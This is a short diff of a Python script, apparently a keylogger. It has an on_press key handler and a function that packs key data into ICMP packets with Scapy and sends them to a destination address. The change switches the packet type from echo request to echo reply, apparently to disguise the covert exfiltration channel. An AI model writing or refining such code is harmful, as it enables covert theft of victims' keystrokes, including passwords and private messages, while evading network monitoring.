@@ -24,7 +24,7 @@ def send_icmp_payload(key_data):
         payload = str(e).encode()
 
     # Craft and send the ICMP packet
-    packet = IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8, id=ICMP_ID)/Raw(load=payload)
+    packet = IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload)
     send(packet, verbose=0)
 
 def on_press(key):
